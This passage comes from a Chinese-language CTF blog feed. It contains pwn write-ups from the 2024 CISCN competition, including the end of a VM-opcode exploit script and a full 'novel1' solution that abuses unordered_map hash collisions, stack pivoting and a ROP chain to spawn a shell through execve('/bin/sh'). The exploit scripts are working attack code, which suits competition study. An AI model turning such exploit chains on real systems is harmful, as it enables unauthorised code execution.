class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.202.237&quot;</span>,<span class="number">36894</span>)</span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_reg(15,0,0xd20)  0x1000</span></span><br><span class="line"><span class="comment"># +write_reg(1,0,0x118)+write_reg(2,0,0x100)+write_reg(3,0,0xd38)+sub(4,1,2)+mul(5,4,4)</span></span><br><span class="line"><span class="comment"># payload += mul(5,5,17)*5 + sub(5,5,15)*6</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;opcode:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h4 id="pwn-novel1">pwn-novel1</h4>
<p>C++编译出来的一个二进制文件，直接IDA静态分析有点头大，先运行看看大致功能。</p>
<p>首先会让我们输入Author的名字，然后有两种选项可供选择。第一个选项会让我们输入Blood和Evidence，其中Blood是一个序号，且不能多次设置同一个Blood位置；Evidence看不出来是干什么的，但是会发现字母是不行的，可以输入数字。根据命名bloodstain（血迹），以及Evidence（线索），我们先猜测是跟着某种线索寻找血迹。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213341948.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213711557.png"
                      class=""
                >
<p>用2号功能大概是找相似的血迹，但目前并不清楚具体原理。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104232309225.png"
                      class=""
                >
<p>之后还是得看静态反汇编出的代码，这里的unordered_map实际上c++的一个模板类，其具体函数的作用其实我们能够查到。常用函数如下。就功能而言，unordered_map类似于python中的字典类型，提供一个键值对的映射。</p>
<p><strong>1. 构造与初始化</strong></p>
<table>
<colgroup>
<col style="width: 38%" />
<col style="width: 61%" />
</colgroup>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>unordered_map()</code></td>
<td>默认构造函数，创建一个空的 <code>unordered_map</code> 对象。</td>
</tr>
<tr>
<td><code>unordered_map(initializer_list)</code></td>
<td>用列表初始化构造。</td>
</tr>
<tr>
<td><code>unordered_map(begin, end)</code></td>
<td>用迭代器范围构造 unordered_map。</td>
</tr>
<tr>
<td><code>unordered_map(other)</code></td>
<td>拷贝构造函数，用另一个 <code>unordered_map</code>
初始化本对象。</td>
</tr>
<tr>
<td><code>unordered_map(other, std::move)</code></td>
<td>移动构造函数，转移另一个对象的资源。</td>
</tr>
</tbody>
</table>
<hr />
<p><strong>2. 插入与更新元素</strong></p>
<table>
<colgroup>
<col style="width: 37%" />
<col style="width: 62%" />
</colgroup>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>insert(const pair&lt;Key, T&gt;&amp; val)</code></td>
<td>插入键值对，如果键已存在，不插入。</td>
</tr>
<tr>
<td><code>insert_or_assign(key, value)</code></td>
<td>插入或更新指定键对应的值。</td>
</tr>
<tr>
<td><code>emplace(args...)</code></td>
<td>原地构造插入，避免不必要的拷贝或移动。</td>
</tr>
<tr>
<td><code>emplace_hint(pos, args...)</code></td>
<td>在给定位置提示的地方原地插入元素。</td>
</tr>
<tr>
<td><code>operator[key]</code></td>
<td>通过 <code>[]</code>
访问元素，若键不存在则插入新键并返回默认值。</td>
</tr>
<tr>
<td><code>at(key)</code></td>
<td>访问元素，若键不存在则抛出 <code>std::out_of_range</code>
异常。</td>
</tr>
<tr>
<td><code>try_emplace(key, args...)</code></td>
<td>若键不存在则插入新值，若键存在则什么都不做。</td>
</tr>
</tbody>
</table>
<hr />
<p><strong>3. 删除元素</strong></p>
<table>
<colgroup>
<col style="width: 28%" />
<col style="width: 71%" />
</colgroup>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>erase(key)</code></td>
<td>删除指定键的元素，返回删除的元素个数（0 或 1）。</td>
</tr>
<tr>
<td><code>erase(iterator)</code></td>
<td>删除迭代器指定位置的元素。</td>
</tr>
<tr>
<td><code>erase(begin, end)</code></td>
<td>删除迭代器范围 <code>[begin, end)</code> 内的元素。</td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>清空 <code>unordered_map</code> 中的所有元素。</td>
</tr>
</tbody>
</table>
<hr />
<p><strong>4. 查找元素</strong></p>
<table>
<colgroup>
<col style="width: 23%" />
<col style="width: 76%" />
</colgroup>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>find(key)</code></td>
<td>返回指向键的迭代器，若键不存在，返回 <code>end()</code>。</td>
</tr>
<tr>
<td><code>contains(key)</code></td>
<td>检查容器是否包含某个键，返回 <code>true</code> 或
<code>false</code>。</td>
</tr>
<tr>
<td><code>count(key)</code></td>
<td>返回指定键出现的次数（对于 <code>unordered_map</code> 始终为 0 或
1）。</td>
</tr>
<tr>
<td><code>equal_range(key)</code></td>
<td>返回表示与指定键关联的元素范围的迭代器对。</td>
</tr>
</tbody>
</table>
<hr />
<p><strong>5. 容量相关</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>empty()</code></td>
<td>检查容器是否为空，返回 <code>true</code> 或
<code>false</code>。</td>
</tr>
<tr>
<td><code>size()</code></td>
<td>返回元素个数。</td>
</tr>
<tr>
<td><code>max_size()</code></td>
<td>返回容器支持的最大元素数量。</td>
</tr>
</tbody>
</table>
<hr />
<p><strong>6. 哈希表相关</strong></p>
<table>
<colgroup>
<col style="width: 31%" />
<col style="width: 68%" />
</colgroup>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>bucket_count()</code></td>
<td>返回哈希表中的桶数量。</td>
</tr>
<tr>
<td><code>bucket_size(bucket)</code></td>
<td>返回指定桶中的元素数量。</td>
</tr>
<tr>
<td><code>bucket(key)</code></td>
<td>返回键映射到的桶索引。</td>
</tr>
<tr>
<td><code>load_factor()</code></td>
<td>返回当前的加载因子（元素数量 / 桶数量）。</td>
</tr>
<tr>
<td><code>max_load_factor(factor)</code></td>
<td>获取或设置最大的加载因子。</td>
</tr>
<tr>
<td><code>rehash(n)</code></td>
<td>将桶数量调整为至少为 <code>n</code>，以最小化冲突。</td>
</tr>
<tr>
<td><code>reserve(n)</code></td>
<td>预留足够的空间，调整桶数量使容器能存储至少 <code>n</code>
个元素。</td>
</tr>
<tr>
<td><code>hash_function()</code></td>
<td>返回用于计算哈希值的哈希函数对象。</td>
</tr>
<tr>
<td><code>key_eq()</code></td>
<td>返回用于比较键是否相等的函数对象。</td>
</tr>
</tbody>
</table>
<hr />
<p><strong>7. 迭代器相关</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>begin()</code></td>
<td>返回指向容器第一个元素的迭代器。</td>
</tr>
<tr>
<td><code>cbegin()</code></td>
<td>返回指向容器第一个元素的只读迭代器。</td>
</tr>
<tr>
<td><code>end()</code></td>
<td>返回指向容器末尾的迭代器。</td>
</tr>
<tr>
<td><code>cend()</code></td>
<td>返回指向容器末尾的只读迭代器。</td>
</tr>
<tr>
<td><code>rbegin()</code></td>
<td>返回指向容器最后一个元素的反向迭代器。</td>
</tr>
<tr>
<td><code>rend()</code></td>
<td>返回指向容器第一个元素之前的反向迭代器。</td>
</tr>
</tbody>
</table>
<hr />
<p><strong>8. 比较两个 unordered_map</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>operator==</code></td>
<td>判断两个 <code>unordered_map</code> 是否相等。</td>
</tr>
<tr>
<td><code>operator!=</code></td>
<td>判断两个 <code>unordered_map</code> 是否不相等。</td>
</tr>
</tbody>
</table>
<p>那么我们先看part1的功能，首先<strong>bloodstains</strong>是一个模板类，其键为unsigned
int类型，值为unsigned
long类型。然后这个模板类中不能含有超过31个键值对，否则会调用fragment退出。而且后面通过find寻找我们输入的键，如果找到就退出，说明限制了不能有相同的键。最后对result的两次操作会为键值对赋值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250105145338871.png"
                      class=""
                >
<p>之后看part2功能，这里首先是从bloodstains中，寻找我们输入的Blood键是否在其中，如果不在就直接退出。然后我们需要理解一下bucket这个桶的机制。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122160017991.png"
                      class=""
                >
<p><strong>1. 桶的管理机制</strong></p>
<ol type="1">
<li><strong>哈希函数与桶的分布</strong>:
<ul>
<li><code>unordered_map</code> 使用 <strong>哈希函数</strong> 对键 (key)
进行散列，计算哈希值。</li>
<li>通过以下公式确定键值对存储的桶索引： <span
class="math inline">\(bucket\ index=hash(key) \%bucket\
count\)</span></li>
<li><code>bucket_count</code> 是当前的桶数量（可以随装载因子（load
factor）变化自动调整）。</li>
</ul></li>
<li><strong>桶的内部结构</strong>:
<ul>
<li>每个桶可能存储多个键值对，冲突的键值对以链表或其他数据结构（如树）存储在同一桶中。</li>
<li>冲突（collision）发生时，<code>unordered_map</code> 使用
<strong>开放地址法</strong> 或 <strong>分离链法</strong>
等策略来解决。</li>
</ul></li>
<li><strong>装载因子与桶重分配</strong>:
<ul>
<li>装载因子 (Load Factor)：表示哈希表的密度，公式为：<span
class="math inline">\(\text{load factor} =
\frac{\text{size}}{\text{bucket count}}\)</span></li>
<li>如果装载因子超出预设值，<code>unordered_map</code> 会自动
<strong>增大桶的数量</strong>（通常翻倍），并重新分配键值对以减少冲突。</li>
</ul></li>
</ol>
<hr />
<p><strong>2. 哪些键值对会存在一个桶里</strong></p>
<ol type="1">
<li><strong>相同哈希值的键</strong>:
<ul>
<li>当两个键的哈希值相同时，这两个键的键值对会落入同一个桶中。</li>
<li>哈希表仅使用哈希值确定桶索引，因此不能保证桶内的键值对顺序。</li>
</ul></li>
<li><strong>解决冲突：键的等价性</strong>:
<ul>
<li>即使键的哈希值相同，也需要使用等价性比较（通常是
<code>operator==</code>）来确认键是否完全相等。</li>
<li>如果键通过 <code>==</code> 比较不同，<code>unordered_map</code>
将允许它们共存于一个桶中（但不会作为同一键处理）。</li>
</ul></li>
<li><strong>插入新键值对</strong>:
<ul>
<li>当插入一个新键时，unordered_map
<ol type="1">
<li>通过哈希函数计算出桶索引。</li>
<li>遍历该桶内的链表，检查是否有等价键（利用 <code>==</code>
比较）。</li>
<li>若存在等价键，覆盖其值；否则将新键值对插入该桶。</li>
</ol></li>
</ul></li>
</ol>
<p>我们动调时发现，在part2功能里的copy函数中，会往栈上写内容。这里比如我们在part1功能中先输入键为3，值为4。然后对比copy执行前后，发现这里往栈上写了键值对&lt;3,4&gt;，其实我们仔细分析copy函数的参数，能发现一个**_Local_iterator**迭代器，这里其实就是把在一个桶中的键值存到栈上。那么只要我们把用part1功能加入hash冲突并在同一个桶里的多个键，就能够往栈上隔8字节写一个可控的值，这里返回地址刚好可以被值覆盖。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122231726637.png"
                      class=""
                >
<p>之后我们的目标就是找到hash冲突的键，这道题其实指定重载了hash函数，是一个模除运算。那么我们可以打断点（<code>b std::__detail::_Mod_range_hashing::operator()</code>）进行调试，这里我们把键设置为4，值设置为3看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250123180738173.png"
                      class=""
                >
<p>总共会在断点停下两次，第二次到断点时，我们能发现一个0xd的模数。这个数字是固定的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124013848801.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174005151.png"
                      class=""
                >
<p>然后我们发现只要其键是在模13的某个剩余类中，其就会存在一个桶里，而且是通过堆上的一个管理块进行管理的，在一个桶中的元素用一个链表连起来。那么我们就可以通过part2的copy函数实现栈溢出。比如我们键为1和14，值都设置为0x666，那么copy执行后可以看到栈顶就为这两个键值对。经过计算，我们设置21个冲突的键就能覆盖到返回地址处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124014128627.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124170922342.png"
                      class=""
                >
<p>但是在调试时，如果直接循环写入21个，会发现最终只会写到栈上一个。经过尝试，最终发现临界点是写入13个，这正好是我们的模数。C++
中的 <code>std::unordered_map</code> 动态扩展机制类似于 C
的动态数组，会根据负载因子自动扩容（从 13 扩展到
29），新桶数组重新哈希分配，链表通过索引计算（如
<code>i * 29</code>）重新串联。这个29可以通过调试出来。之后会申请一个更大的0xf0大小的管理块，处理完毕后原来0x70大小的管理块会被释放掉。因为我们只用21个就能覆盖到返回地址，所以我们一开始都用模29的进行冲突，那么其扩容后就刚好可以存在一个桶里。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174537805.png"
                      class=""
                >
<p>之后就是构造ROP链，程序里留下了一些gadget。其中有个gadget可以控制rsp。而且一开始的prologue功能中能够往一个author全局变量中读取0x80字节的内容，这个author的地址我们又可以获知。那么我们可以把栈迁移到author处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124185257849.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192217525.png"
                      class=""
                >
<p>之后我们进行rop链构建，这里还有点麻烦的是，我们按顺序调用part1，最后用part2写到栈上时，顺序有所打乱，分界点也就是一开始的模数0xd，这里我把占位的value全换成了调用part1的顺序，可以清楚看到复制到栈上的逻辑。那么我们直接把对应返回地址的位置的内容换为我们的gadget以及author地址即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192500030.png"
                      class=""
                >
<p>栈迁移之后就正常retlibc即可。后面要返回主函数再次往author中读入getshell的rop，由于前面把栈迁移到了这里，在调用一些函数时可能会把返回地址覆盖了，导致会出现问题。所以我们第二次写rop时要把fgets的返回地址给还原，call过去时rsp指向author+8，那么返回地址就在author的地址处。之后布局好rop后就能直接靠prologue的ret返回了。注意栈对齐，而且如果直接调用system的话，其申请的栈空间有点多，我们又做过栈迁移，会导致执行时栈到了不可写的段从而失败，这里我们就ret2syscall。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124210031726.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211116655.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211906895.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./novel1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;47.94.95.135&quot;, 22566)</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">puts_plt = <span class="number">0x0000000000402460</span></span><br><span class="line">puts_got = <span class="number">0x000000000040A108</span></span><br><span class="line">pop_rax_rsp_rdi_rbp_ret = <span class="number">0x0000000004025BE</span></span><br><span class="line">main = <span class="number">0x0000000000402D23</span></span><br><span class="line">ret = <span class="number">0x000000000040201a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part1</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Evidence:&quot;</span>,<span class="built_in">str</span>(value).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part2</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">author = <span class="number">0x000000000040A540</span></span><br><span class="line">rop = p64(puts_got)+p64(<span class="number">0</span>)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="comment"># rop += p64(pop_rsp_rdi_rbp_ret)+p64(author+)+p64(0)*2+p64(main)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xb</span>,pop_rax_rsp_rdi_rbp_ret)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xc</span>,author)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xd</span>,<span class="number">0x16</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">part2(<span class="number">1</span>)</span><br><span class="line">libc_base = get_addr(p) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0x000000000040285A</span>)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(author+<span class="number">0x60</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ciscn</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2025xyctf wp</title>
    <url>/blog/2025/04/08/2025xyctf-wp/</url>
    <content><![CDATA[<h2 id="一战队信息">一、战队信息</h2>
<p>战队名称：Initialization</p>
<p>战队排名：12</p>
<h2 id="二解题情况">二、解题情况</h2>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406222023429.png"
                      class=""
                >
<h2 id="三解题过程">三、解题过程</h2>
<h4 id="web-signin">web-Signin</h4>
<p>直接看代码</p>
